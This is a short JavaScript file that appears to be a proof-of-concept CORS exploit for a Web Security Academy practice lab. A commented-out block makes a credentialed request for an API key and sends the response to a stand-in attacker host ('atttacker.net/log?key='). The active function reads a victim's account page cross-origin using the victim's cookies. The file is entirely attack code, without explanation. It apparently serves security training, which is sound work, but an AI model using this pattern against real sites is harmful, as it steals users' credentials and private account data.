/*var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://btc-exchange/api/requestApiKey',true);
req.withCredentials = true;
req.send();

function reqListener() {
    location='//atttacker.net/log?key='+this.responseText;
};
*/

function cors() {
  document.getElementById('report').innerHTML= document.domain + ' * ';
  var req = new XMLHttpRequest();
  req.onload = function() {
      document.getElementById('report').innerHTML = this.responseText;
  }
  req.open('get','https://0ab0002a04799b80c01d1367008700dc.web-security-academy.net/my-account',true);
  req.withCredentials = true;
  req.send();
}
